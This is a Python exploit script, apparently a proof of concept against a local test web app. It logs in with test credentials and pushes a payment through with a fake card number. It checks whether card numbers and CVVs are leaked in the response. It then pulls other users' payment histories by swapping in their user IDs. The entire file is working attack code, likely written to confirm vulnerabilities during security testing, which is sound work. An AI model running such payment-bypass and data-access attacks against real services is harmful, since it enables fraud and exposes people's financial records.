#!/usr/bin/env python3

import requests
import json

BASE_URL = "http://localhost:5000"

def exploit_payment_gateway():
    login_data = {
        "email": "test@tenantguard.com",
        "password": "test123"
    }
    
    response = requests.post(f"{BASE_URL}/api/auth/login", json=login_data)
    if response.status_code != 200:
        print("[-] Login failed")
        return False
    
    token = response.json()["token"]
    headers = {"Authorization": f"Bearer {token}"}
    
    payment_data = {
        "cardNumber": "1234567890123456",
        "expiryDate": "12/25",
        "cvv": "123",
        "cardholderName": "Fake User",
        "amount": 0.01,
        "plan": "premium",
        "billingAddress": "123 Fake St"
    }
    
    payment_response = requests.post(f"{BASE_URL}/api/payment/process",
                                   headers=headers, json=payment_data)
    
    if payment_response.status_code == 200:
        result = payment_response.json()
        print("[+] Payment processed with fake card!")
        print(f"[+] Transaction ID: {result.get('transactionId')}")
        
        if 'paymentDetails' in result:
            print("[!] Payment details exposed in response!")
            print(f"[!] Card Number: {result['paymentDetails'].get('cardNumber')}")
            print(f"[!] CVV: {result['paymentDetails'].get('cvv')}")
    
    user_ids = ["507f1f77bcf86cd799439011", "507f1f77bcf86cd799439012"]
    
    for user_id in user_ids:
        params = {"userId": user_id}
        history_response = requests.get(f"{BASE_URL}/api/payment/history",
                                      headers=headers, params=params)
        
        if history_response.status_code == 200:
            history = history_response.json()
            print(f"[+] Accessed payment history for user {user_id}")
            print(f"[+] Found {len(history.get('paymentHistory', []))} payments")
    
    return True

if __name__ == "__main__":
    exploit_payment_gateway()